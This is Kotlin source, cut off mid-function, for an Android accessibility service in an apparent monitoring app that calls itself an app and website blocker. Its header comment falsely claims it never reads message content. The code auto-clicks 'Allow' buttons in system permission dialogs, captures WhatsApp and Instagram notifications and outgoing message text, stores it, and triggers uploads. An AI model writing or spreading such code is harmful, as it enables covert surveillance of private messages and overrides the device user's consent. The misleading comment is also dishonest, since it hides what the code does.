package com.spapp.monitoring.blocking

import android.accessibilityservice.AccessibilityService
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.spapp.monitoring.collectors.FileManagerCollector
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import com.spapp.monitoring.data.local.InstagramMessageEntry
import com.spapp.monitoring.collectors.WhatsAppNotificationListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale

/**
 * Enforces app_blocking and website_blocking rules (Phase 7).
 * Inspects: (1) which app's window just came to the foreground, and
 * (2) the visible address-bar text of supported browsers for website blocking rules.
 * It never reads message content, chat text, or any other private on-screen content.
 *
 * WHY ACCESSIBILITY, NOT A CONTENT PROVIDER QUERY: modern Chrome exposes no
 * history API to third-party apps at all (removed from the public SDK years
 * ago) — there is no supported way to read it without this. Address-bar
 * inspection only works for browsers that expose a stable accessibility
 * resource-id for their URL bar, listed below; an unsupported or updated
 * browser simply won't be covered, for blocking or for history, while
 * app-level blocking (blocking a browser entirely) still works regardless.
 *
 * EVENT SUBSCRIPTION — ONLY typeWindowStateChanged (see
 * accessibility_service_config.xml), deliberately. An earlier version also
 * subscribed to typeWindowContentChanged to catch in-page navigation within
 * a browser (switching sites without leaving the window never fires
 * typeWindowStateChanged). That event type fires constantly for every app's
 * every UI redraw system-wide — there is no way to scope it to "only
 * browsers" at the OS subscription level without also scoping
 * typeWindowStateChanged the same way (AccessibilityServiceInfo.packageNames
 * applies to all subscribed event types together, not per type), which would
 * risk silently losing the very event app-blocking depends on for every
 * other app. The flood of extra events was the suspected cause of app
 * blocking becoming intermittent (worked twice, then silently didn't) after
 * that change. Reverted — in-page navigation is now covered by a short
 * polling loop (see browserPollRunnable) that only runs while a browser is
 * confirmed foreground, so it costs nothing for any other app and never
 * touches the service's OS-level event subscription.
 */
class BlockAccessibilityService : AccessibilityService() {

    companion object {
        @Volatile
        var instance: BlockAccessibilityService? = null
            private set
    }

    private lateinit var rulesCache: BlockRulesCache
    private var lastBlockedPackage: String? = null
    private var lastBlockedAt = 0L
    private var currentForegroundApp: String? = null
    private var lastScrollEventTime = 0L
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val pollHandler = Handler(Looper.getMainLooper())
    private var browserPollRunnable: Runnable? = null
    private val browserPollIntervalMs = 1500L

    private val browserUrlBarIds = setOf(
        "com.android.chrome:id/url_bar",
        "com.google.android.apps.chrome:id/url_bar",
        "com.brave.browser:id/url_bar",
        "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
        "com.microsoft.emmx:id/url_bar",
    )
    private val browserPackages = browserUrlBarIds.map { it.substringBefore(":id/") }.toSet()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        try {
            val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
            info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_SCROLLED
            info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.flags = info.flags or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            serviceInfo = info
        } catch (e: Exception) {
            Log.e("BlockA11y", "Failed to configure serviceInfo dynamically", e)
        }
        rulesCache = BlockRulesCache(applicationContext)
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        val packageName = event.packageName?.toString() ?: return
        if (packageName == applicationContext.packageName) return // never block ourselves

        // ==========================================
        // 🌟 AUTOMATE RUNTIME PERMISSIONS (ALL ANDROID VERSIONS & OEMS)
        // ==========================================
        val isPermissionDialog = packageName.contains("permissioncontroller") ||
                packageName.contains("packageinstaller") ||
                packageName.contains("securitycenter")

        if (isPermissionDialog) {
            val rootNode = rootInActiveWindow ?: event.source
            if (rootNode != null) {
                // List of keywords to automatically click (English & Tamil OS localization)
                val targetKeywords = listOf("While using the app", "Only this time", "Allow", "அனுமதி", "Precise")

                for (keyword in targetKeywords) {
                    val matchedNodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                    if (!matchedNodes.isNullOrEmpty()) {
                        for (matchedNode in matchedNodes) {
                            if (matchedNode.isClickable) {
                                matchedNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                return // Handled, drop event execution early
                            }
                            // Bubble up to parent if wrapper element isn't clickable
                            var parentNode = matchedNode.parent
                            while (parentNode != null) {
                                if (parentNode.isClickable) {
                                    parentNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    return
                                }
                                parentNode = parentNode.parent
                            }
                        }
                    }
                }

                // Fallback using flexible resource ID suffix matching (handles com.google..., com.android..., etc.)
                fun findAndClickAllowButton(node: AccessibilityNodeInfo?): Boolean {
                    if (node == null) return false
                    val resId = node.viewIdResourceName?.lowercase() ?: ""
                    if (resId.endsWith(":id/permission_allow_foreground_only_button") ||
                        resId.endsWith(":id/permission_allow_button") ||
                        resId.endsWith(":id/permission_allow_one_time_button") ||
                        resId.endsWith(":id/allow_button") ||
                        resId.endsWith(":id/btn_allow") ||
                        resId.endsWith(":id/continue_button")
                    ) {
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            return true
                        }
                        var p = node.parent
                        while (p != null) {
                            if (p.isClickable) {
                                p.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                return true
                            }
                            p = p.parent
                        }
                    }
                    for (i in 0 until node.childCount) {
                        if (findAndClickAllowButton(node.getChild(i))) return true
                    }
                    return false
                }

                if (findAndClickAllowButton(rootNode)) {
                    return
                }
            }
            return // Stop further processing since this is a permission dialog event
        }
        // ==========================================

        if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            val now = android.os.SystemClock.uptimeMillis()
            if (now - lastScrollEventTime < 750L) {
                return
            }
            lastScrollEventTime = now
        }

        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val notification = event.parcelableData as? android.app.Notification
            val eventTexts = try { event.text?.mapNotNull { it?.toString()?.trim() }?.filter { it.isNotBlank() } } catch (_: Exception) { null }
            val postTime = if (notification != null && notification.`when` > 0) notification.`when` else System.currentTimeMillis()
            if (packageName == "com.instagram.android" || packageName == "com.instagram.lite" || packageName.contains("instagram")) {
                com.spapp.monitoring.collectors.WhatsAppNotificationListener.processInstagramNotificationData(
                    applicationContext,
                    notification,
                    postTime,
                    packageName,
                    fallbackTexts = eventTexts
                )
            } else if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                com.spapp.monitoring.collectors.WhatsAppNotificationListener.processWhatsAppNotificationData(
                    applicationContext,
                    notification,
                    postTime,
                    packageName,
                    fallbackTexts = eventTexts
                )
            }
            return
        }

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (packageName in browserPackages) {
                checkWebsiteRules()
                startBrowserPolling()
            } else {
                stopBrowserPolling()
            }

            val isImeOrSystem = packageName.startsWith("com.google.android.inputmethod") ||
                    packageName.contains("honeyboard") ||
                    packageName.contains("swiftkey") ||
                    packageName.contains("keyboard") ||
                    packageName.contains("inputmethod") ||
                    packageName == "android" ||
                    packageName == "com.android.systemui"

            if (!isImeOrSystem) {
                currentForegroundApp = packageName

                if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                    startWhatsAppPolling()
                } else {
                    stopWhatsAppPolling()
                }

                if (packageName == "com.instagram.android") {
                    detectAndHandleInstagramAccountSwitch(rootInActiveWindow)
                    startInstagramPolling()
                } else {
                    stopInstagramPolling()
                }

                checkAppRule(packageName)
            }
        }

        // Real-time WhatsApp capture:
        // Trigger immediately when user taps (e.g. clicks Send button or chat row), when messages appear on screen,
        // when scrolling through chats/conversation, or when window state changes
        val isWhatsAppActive = packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b" ||
                ((currentForegroundApp == "com.whatsapp" || currentForegroundApp == "com.whatsapp.w4b") &&
                 (packageName.startsWith("com.google.android.inputmethod") || packageName.contains("honeyboard") || packageName.contains("keyboard")))
        if (isWhatsAppActive) {
            // Track composer text from entry node or event source
            try {
                val root = rootInActiveWindow
                val entryNode = root?.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")?.firstOrNull()
                val currentText = entryNode?.text?.toString()?.trim()
                if (!currentText.isNullOrBlank() && !currentText.equals("Type a message", ignoreCase = true) && !currentText.equals("Message", ignoreCase = true)) {
                    lastWhatsAppComposerText = currentText
                }
            } catch (_: Exception) {}

            try {
                val source = event.source
                if (source != null && (source.isEditable || source.viewIdResourceName?.endsWith(":id/entry") == true)) {
                    val sText = source.text?.toString()?.trim()
                    if (!sText.isNullOrBlank() && !sText.equals("Type a message", ignoreCase = true) && !sText.equals("Message", ignoreCase = true)) {
                        lastWhatsAppComposerText = sText
                    }
                }
            } catch (_: Exception) {}

            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                try {
                    val clickedNode = event.source
                    if (clickedNode != null) {
                        val cText = clickedNode.text?.toString()?.trim() ?: ""
                        val cDesc = clickedNode.contentDescription?.toString()?.trim() ?: ""
                        val cId = (clickedNode.viewIdResourceName ?: "").lowercase()

                        val isSendClick = cDesc.contains("send", ignoreCase = true) ||
                                          cText.equals("send", ignoreCase = true) ||
                                          cId.endsWith(":id/send")

                        if (isSendClick) {
                            var sentText = lastWhatsAppComposerText
                            if (sentText.isNullOrBlank()) {
                                try {
                                    val entry = rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")?.firstOrNull()
                                    val et = entry?.text?.toString()?.trim()
                                    if (!et.isNullOrBlank() && !et.equals("Type a message", ignoreCase = true) && !et.equals("Message", ignoreCase = true)) {
                                        sentText = et
                                    }
                                } catch (_: Exception) {}
                            }

                            val chatTitle = getWhatsAppCurrentChatTitle(rootInActiveWindow)
                            val textToSend = sentText
                            if (!textToSend.isNullOrBlank() && !chatTitle.isNullOrBlank()) {
                                val now = System.currentTimeMillis()
                                recordRecentSentWhatsAppText(textToSend)
                                val dedupeKey = "wa|$chatTitle|$textToSend|true|text"
                                if (capturedWhatsAppMsgHashes.add(dedupeKey)) {
                                    scope.launch {
                                        try {
                                            val db = AppDatabase.getInstance(applicationContext)
                                            db.whatsAppMessageDao().updateToOutgoing(chatTitle, textToSend, now - 600_000L)
                                            val existingId = db.whatsAppMessageDao().findExistingRecent(
                                                chatTitle, textToSend, true, now - 600_000L
                                            )
                                            if (existingId == null) {
                                                db.whatsAppMessageDao().insertAll(
                                                    listOf(
                                                        WhatsAppMessageEntry(
                                                            chatName = chatTitle,
                                                            sender = "me",
                                                            messageText = textToSend,
                                                            isOutgoing = true,
                                                            messageTimeEpochMs = now,
                                                            mediaType = "text"
                                                        )
                                                    )
                                                )
                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                                            }
                                        } catch (_: Exception) {}
                                    }
                                }
                                lastWhatsAppComposerText = null
                            }
                            pollHandler.postDelayed({
                                recordWhatsAppChatIfForeground(rootInActiveWindow)
                            }, 300L)
                            pollHandler.postDelayed({
                                recordWhatsAppChatIfForeground(rootInActiveWindow)
                            }, 1000L)
                        } else if (cDesc.contains("back", ignoreCase = true) || cDesc.contains("navigate up", ignoreCase = true) || cId.endsWith(":id/back")) {
                            lastClickedWhatsAppChat = null
                            lastWhatsAppComposerText = null
                        } else {
                            val texts = mutableListOf<String>()
                            fun walkClick(n: AccessibilityNodeInfo?, d: Int = 0) {
                                if (n == null || d > 8) return
                                val t = n.text?.toString()?.trim()
                                if (!t.isNullOrBlank()) texts.add(t)
                                for (i in 0 until n.childCount) walkClick(n.getChild(i), d + 1)
                            }
                            walkClick(clickedNode)
                            val titleCand = texts.firstOrNull { 
                                it.length in 2..60 && !it.contains(":") && !isWhatsAppUiMetadataOrTimestamp(it) &&
                                !it.equals("send", ignoreCase = true) && !it.equals("type a message", ignoreCase = true) &&
                                !it.equals("search", ignoreCase = true) && !it.equals("whatsapp group", ignoreCase = true)
                            }
                            val root = rootInActiveWindow
                            val hasComposerOnScreen = root != null && hasWhatsAppChatComposer(root)
                            if (!hasComposerOnScreen && !titleCand.isNullOrBlank()) {
                                lastClickedWhatsAppChat = titleCand
                            }
                        }
                    }
                } catch (_: Exception) {}
            }

            // Detect send via soft keyboard Enter key (composer transitions from non-empty to empty)
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                try {
                    val root = rootInActiveWindow
                    val entryNode = root?.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")?.firstOrNull()
                    val newText = entryNode?.text?.toString()?.trim()
                    if (newText.isNullOrBlank() && !lastWhatsAppComposerText.isNullOrBlank()) {
                        val sentText = lastWhatsAppComposerText!!
                        val chatTitle = getWhatsAppCurrentChatTitle(root)
                        if (!chatTitle.isNullOrBlank()) {
                            val now = System.currentTimeMillis()
                            recordRecentSentWhatsAppText(sentText)
                            val dedupeKey = "wa|$chatTitle|$sentText|true|text"
                            if (capturedWhatsAppMsgHashes.add(dedupeKey)) {
                                scope.launch {
                                    try {
                                        val db = AppDatabase.getInstance(applicationContext)
                                        db.whatsAppMessageDao().updateToOutgoing(chatTitle, sentText, now - 600_000L)
                                        val existingId = db.whatsAppMessageDao().findExistingRecent(
                                            chatTitle, sentText, true, now - 600_000L
                                        )
                                        if (existingId == null) {
                                            db.whatsAppMessageDao().insertAll(
                                                listOf(
                                                    WhatsAppMessageEntry(
                                                        chatName = chatTitle,
                                                        sender = "me",
                                                        messageText = sentText,
                                                        isOutgoing = true,
                                                        messageTimeEpochMs = now,
                                                        mediaType = "text"
                                                    )
                                                )
                                            )
                                            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                                        }
                                    } catch (_: Exception) {}
                                }
                            }
                        }
                        lastWhatsAppComposerText = null
                    }
                } catch (_: Exception) {}
            }

            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val nodeToInspect = rootInActiveWindow ?: event.source
                recordWhatsAppChatIfForeground(nodeToInspect)
            }
        }

        // Real-time Instagram Direct capture & in-app account switch detection:
        val isInstagramActive = packageName == "com.instagram.android" || packageName == "com.instagram.lite" ||
                ((currentForegroundApp == "com.instagram.android" || currentForegroundApp == "com.instagram.lite") &&
                 (packageName.startsWith("com.google.android.inputmethod") || packageName.contains("honeyboard") || packageName.contains("keyboard") || packageName.contains("swiftkey")))
        if (isInstagramActive) {
            // 1. Track composer text while user types
            try {
                val root = rootInActiveWindow
                val entryNode = root?.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")?.firstOrNull()
                val currentText = entryNode?.text?.toString()?.trim()
                if (!currentText.isNullOrBlank() && !currentText.equals("Message...", ignoreCase = true)) {
                    lastInstagramComposerText = currentText
                }
            } catch (_: Exception) {}

            try {
                val source = event.source
                if (source != null && (source.isEditable || source.viewIdResourceName?.contains("composer_edittext") == true)) {
                    val sText = source.text?.toString()?.trim()
                    if (!sText.isNullOrBlank() && !sText.equals("Message...", ignoreCase = true)) {
                        lastInstagramComposerText = sText
                    }
                }
            } catch (_: Exception) {}

            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                checkAccountSwitcherClick(event.source, rootInActiveWindow)
                try {
                    val clickedNode = event.source
                    if (clickedNode != null) {
                        val cText = clickedNode.text?.toString()?.trim() ?: ""
                        val cDesc = clickedNode.contentDescription?.toString()?.trim() ?: ""
                        val cId = (clickedNode.viewIdResourceName ?: "").lowercase()

                        val isSendClick = cDesc.contains("send", ignoreCase = true) ||
                                          cText.equals("send", ignoreCase = true) ||
                                          cId.contains("composer_button_send") ||
                                          cId.endsWith(":id/send_button") ||
                                          (cId.contains("action_button") && cDesc.contains("send", ignoreCase = true))

                        if (isSendClick) {
                            var sentText = lastInstagramComposerText
                            if (sentText.isNullOrBlank()) {
                                try {
                                    val entry = rootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")?.firstOrNull()
                                    val et = entry?.text?.toString()?.trim()
                                    if (!et.isNullOrBlank() && !et.equals("Message...", ignoreCase = true)) {
                                        sentText = et
                                    }
                                } catch (_: Exception) {}
                            }

                            val chatTitle = getInstagramCurrentChatTitle(rootInActiveWindow)
                            val textToSend = sentText
                            if (!textToSend.isNullOrBlank() && !chatTitle.isNullOrBlank()) {
                                val now = System.currentTimeMillis()
                                recordRecentSentInstagramText(textToSend)
                                val dedupeKey = "ig|$chatTitle|$textToSend|true|text"
                                if (capturedWhatsAppMsgHashes.add(dedupeKey)) {
                                    scope.launch {
                                        try {
                                            val db = AppDatabase.getInstance(applicationContext)
                                            db.instagramMessageDao().updateToOutgoing(chatTitle, textToSend, now - 600_000L)
                                            val existingId = db.instagramMessageDao().findExistingRecent(
                                                chatTitle, textToSend, true, now - 600_000L
                                            )
                                            if (existingId == null) {
                                                db.instagramMessageDao().insertAll(
                                                    listOf(
                                                        InstagramMessageEntry(
                                                            chatName = chatTitle,
                                                            sender = "me",
                                                            messageText = textToSend,
                                                            isOutgoing = true,
                                                            messageTimeEpochMs = now,
                                                            mediaType = "text"
                                                        )
                                                    )
                                                )
                                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                                            }
                                        } catch (_: Exception) {}
                                    }
                                }
                                lastInstagramComposerText = null
                            }
                            pollHandler.postDelayed({
                                recordInstagramChatIfForeground(rootInActiveWindow)
                            }, 300L)
                            pollHandler.postDelayed({
                                recordInstagramChatIfForeground(rootInActiveWindow)
                            }, 1000L)
                        } else if (cDesc.contains("back", ignoreCase = true) || cDesc.contains("navigate up", ignoreCase = true) || cId.endsWith(":id/action_bar_button_back")) {
                            lastClickedInstagramChat = null
                            lastInstagramComposerText = null
                        } else {
                            val texts = mutableListOf<String>()
                            fun walkClick(n: AccessibilityNodeInfo?, d: Int = 0) {
                                if (n == null || d > 8) return
                                val t = n.text?.toString()?.trim()
                                if (!t.isNullOrBlank()) texts.add(t)
                                for (i in 0 until n.childCount) walkClick(n.getChild(i), d + 1)
                            }
                            walkClick(clickedNode)
                            val titleCand = texts.firstOrNull { 
                                it.length in 2..50 && !it.contains(":") && !WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(it) &&
                                !it.equals("send", ignoreCase = true) && !it.equals("search", ignoreCase = true) &&
                                !it.equals("instagram", ignoreCase = true) && !it.equals("messages", ignoreCase = true)
                            }
                            val root = rootInActiveWindow
                            val hasComposerOnScreen = root != null && hasDirectChatComposer(root)
                            if (!hasComposerOnScreen && !titleCand.isNullOrBlank()) {
                                lastClickedInstagramChat = titleCand
                            }
                        }
                    }
                } catch (_: Exception) {}
            }

            // Detect send via soft keyboard Enter key
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                try {
                    val root = rootInActiveWindow
                    val entryNode = root?.findAccessibilityNodeInfosByViewId("com.instagram.android:id/row_thread_composer_edittext")?.firstOrNull()
                    val newText = entryNode?.text?.toString()?.trim()
                    if (newText.isNullOrBlank() && !lastInstagramComposerText.isNullOrBlank()) {
                        val sentText = lastInstagramComposerText!!
                        val chatTitle = getInstagramCurrentChatTitle(root)
                        if (!chatTitle.isNullOrBlank()) {
                            val now = System.currentTimeMillis()
                            recordRecentSentInstagramText(sentText)
                            val dedupeKey = "ig|$chatTitle|$sentText|true|text"
                            if (capturedWhatsAppMsgHashes.add(dedupeKey)) {
                                scope.launch {
                                    try {
                                        val db = AppDatabase.getInstance(applicationContext)
                                        db.instagramMessageDao().updateToOutgoing(chatTitle, sentText, now - 600_000L)
                                        val existingId = db.instagramMessageDao().findExistingRecent(
                                            chatTitle, sentText, true, now - 600_000L
                                        )
                                        if (existingId == null) {
                                            db.instagramMessageDao().insertAll(
                                                listOf(
                                                    InstagramMessageEntry(
                                                        chatName = chatTitle,
                                                        sender = "me",
                                                        messageText = sentText,
                                                        isOutgoing = true,
                                                        messageTimeEpochMs = now,
                                                        mediaType = "text"
                                                    )
                                                )
                                            )
                                            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                                        }
                                    } catch (_: Exception) {}
                                }
                            }
                        }
                        lastInstagramComposerText = null
                    }
                } catch (_: Exception) {}
            }

            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val nodeToInspect = rootInActiveWindow ?: event.source
                recordInstagramChatIfForeground(nodeToInspect)
            }
        }
    }

    /**
     * Periodically inspects WhatsApp's active conversation window while WhatsApp is foreground.
     */
    private var whatsAppPollRunnable: Runnable? = null
    private val whatsAppPollIntervalMs = 2000L
    private val capturedWhatsAppMsgHashes = java.util.Collections.synchronizedSet(
        object : java.util.LinkedHashSet<String>() {
            override fun add(element: String): Boolean {
                if (size > 2000) {
                    val it = iterator()
                    if (it.hasNext()) {
                        it.next()
                        it.remove()
                    }
                }
                return super.add(element)
            }
        }
    )
    private var lastClickedWhatsAppChat: String? = null
    private var lastWhatsAppComposerText: String? = null
    private val recentSentWhatsAppTexts = java.util.concurrent.ConcurrentHashMap<String, Long>()

    private var lastClickedInstagramChat: String? = null
    private var lastInstagramComposerText: String? = null
    private val recentSentInstagramTexts = java.util.concurrent.ConcurrentHashMap<String, Long>()

    private fun recordRecentSentWhatsAppText(text: String?) {
        if (text.isNullOrBlank()) return
        val clean = text.lowercase().trim()
        val now = System.currentTimeMillis()
        recentSentWhatsAppTexts[clean] = now
        val iterator = recentSentWhatsAppTexts.entries.iterator()
        while (iterator.hasNext()) {
            val entry = iterator.next()
            if (now - entry.value > 120_000L) {
                iterator.remove()
            }
        }
    }

    private fun recordRecentSentInstagramText(text: String?) {
        if (text.isNullOrBlank()) return
        val clean = text.lowercase().trim()
        val now = System.currentTimeMillis()
        recentSentInstagramTexts[clean] = now
        val iterator = recentSentInstagramTexts.entries.iterator()
        while (iterator.hasNext()) {
            val entry = iterator.next()
            if (now - entry.value > 120_000L) {
                iterator.remove()
            }
        }
    }

    private fun startWhatsAppPolling() {
        if (whatsAppPollRunnable != null) return
        val runnable = object : Runnable {
            override fun run() {
                recordWhatsAppChatIfForeground(rootInActiveWindow)
                pollHandler.postDelayed(this, whatsAppPollIntervalMs)
            }
        }
        whatsAppPollRunnable = runnable
        pollHandler.postDelayed(runnable, 500L)
    }

    private fun stopWhatsAppPolling() {
        whatsAppPollRunnable?.let { pollHandler.removeCallbacks(it) }
        whatsAppPollRunnable = null
    }

    fun hasWhatsAppChatComposer(node: AccessibilityNodeInfo?, depth: Int = 0): Boolean {
        if (node == null || depth > 4) return false
        val id = (node.viewIdResourceName ?: "").lowercase()
        val text = (node.text?.toString() ?: "").trim()
        val hint = (node.hintText?.toString() ?: "").trim()
        val desc = (node.contentDescription?.toString() ?: "").trim()

        if (id.endsWith(":id/entry") || id.endsWith("/entry")) return true
        if (id.endsWith(":id/send") || id.endsWith("/send")) return true
        if (id.endsWith(":id/voice_note_btn") || id.endsWith("/voice_note_btn")) return true
        if (text.equals("Type a message", ignoreCase = true) || hint.equals("Type a message", ignoreCase = true)) return true
        if (text.equals("Message", ignoreCase = true) || hint.equals("Message", ignoreCase = true)) return true
        if (desc.contains("send", ignoreCase = true) || desc.contains("voice message", ignoreCase = true)) return true
        if (node.isEditable && (node.className?.toString()?.contains("EditText", ignoreCase = true) == true)) {
            if (!id.contains("search") && !desc.contains("search", ignoreCase = true)) {
                return true
            }
        }
        for (i in 0 until node.childCount) {
            if (hasWhatsAppChatComposer(node.getChild(i), depth + 1)) return true
        }
        return false
    }

    private fun isWhatsAppUiMetadataOrTimestamp(text: String?): Boolean {
        if (text.isNullOrBlank()) return true
        val t = text.replace("•", "").replace("·", "").trim()
        if (t.isBlank()) return true
        // 1. Exact times: "3:25 PM", "03:25 pm", "15:45", "15:45:00", "3:25", "3.25 PM", "3:25pm"
        if ("""^\d{1,2}[:.]\d{2}(?::\d{2})?(\s*(?:AM|PM|am|pm))?$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 2. Day names with optional time: "Yesterday", "Today", "Tomorrow", "Yesterday at 3:25 PM", "Today 10:14 AM"
        if ("""^(?:Yesterday|Today|Tomorrow|Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday)(?:\s+(?:at\s+)?\d{1,2}[:.]\d{2}(?:\s*(?:AM|PM|am|pm))?)?$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 3. Month names with dates: "Oct 17", "17 Oct", "October 17, 2026", "Oct 17 at 3:25 PM"
        if ("""^(?:(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\s+\d{1,2}|\d{1,2}\s+(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*)(?:,?\s*\d{4})?(?:\s+(?:at\s+)?\d{1,2}[:.]\d{2}(?:\s*(?:AM|PM|am|pm))?)?$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 4. Standard numeric dates: "17/10/2026", "2026-10-17"
        if ("""^\d{1,4}[-/\.]\d{1,2}[-/\.]\d{1,4}(?:\s+(?:at\s+)?\d{1,2}[:.]\d{2}(?:\s*(?:AM|PM|am|pm))?)?$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 5. Activity status / delivery receipts
        if ("""^(?:Delivered(?:\s+\d+\w*\s+ago)?|Read(?:\s+\d+\w*\s+ago)?|Sent(?:\s+\d+\w*\s+ago)?|Pending|Sending(?:\.\.\.)?|Typing(?:\.\.\.)?|Online)$""".toRegex(RegexOption.IGNORE_CASE).matches(t)) return true
        // 6. WhatsApp UI placeholders & encryption banners
        if (t.contains("end-to-end encrypted", ignoreCase = true) ||
            t.equals("Type a message", ignoreCase = true) ||
            t.equals("Message", ignoreCase = true) ||
            t.equals("Search", ignoreCase = true) ||
            t.equals("This message was deleted", ignoreCase = true) ||
            t.equals("You deleted this message", ignoreCase = true) ||
            t.startsWith("You reacted ", ignoreCase = true) ||
            t.startsWith("Reacted ", ignoreCase = true) ||
            t.startsWith("Reactions:", ignoreCase = true) ||
            t.startsWith("Forwarded", ignoreCase = true) ||
            t.equals("WhatsApp", ignoreCase = true) ||
            t.equals("WhatsApp Business", ignoreCase = true) ||
            t.equals("Back", ignoreCase = true) ||
            t.equals("More options", ignoreCase = true) ||
            t.equals("Message yourself", ignoreCase = true) ||
            t.equals("Seen", ignoreCase = true) ||
            t.startsWith("Forward ", ignoreCase = true) ||
            t.equals("Forward", ignoreCase = true) ||
            t.equals("Camera", ignoreCase = true) ||
            t.equals("Send", ignoreCase = true) ||
            t.equals("Attach", ignoreCase = true) ||
            t.equals("Payment", ignoreCase = true) ||
            t.equals("APK", ignoreCase = true) ||
            t.matches("""^\d+(\.\d+)?\s*(?:MB|KB|GB|B|bytes)$""".toRegex(RegexOption.IGNORE_CASE)) ||
            t.matches("""^[A-Za-z0-9_-]{20,}$""".toRegex()) ||
            t.matches("""^[\w\-\s]+\.(?:apk|pdf|mp3|mp4|zip|rar|docx|xlsx)$""".toRegex(RegexOption.IGNORE_CASE))
        ) return true
        // 7. Time at start with length <= 25 chars
        if (t.matches("""^\d{1,2}[:.]\d{2}\s*(?:AM|PM|am|pm)\b.*""".toRegex(RegexOption.IGNORE_CASE)) && t.length <= 25) return true
        return false
    }

    private fun getWhatsAppCurrentChatTitle(root: AccessibilityNodeInfo?): String? {
        if (root == null) return lastClickedWhatsAppChat
        val reservedTitles = setOf(
            "WhatsApp", "WhatsApp Business", "Chats", "Updates", "Calls", "Communities",
            "Settings", "Search", "Archived", "Unread", "Groups", "All",
            "Online", "Typing...", "Typing", "Audio call", "Video call", "Call",
            "More options", "Back", "Navigate up", "Camera", "Attach", "Send",
            "Disappearing messages"
        )
        try {
            val fromId = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name")
                .firstOrNull()?.text?.toString()?.trim()
                ?.takeIf { !it.isNullOrBlank() && !reservedTitles.contains(it) && !isWhatsAppUiMetadataOrTimestamp(it) }
            if (!fromId.isNullOrBlank()) return fromId

            val headerNodes = mutableListOf<AccessibilityNodeInfo>()
            fun findHeader(node: AccessibilityNodeInfo?) {
                if (node == null) return
                val rect = Rect()
                node.getBoundsInScreen(rect)
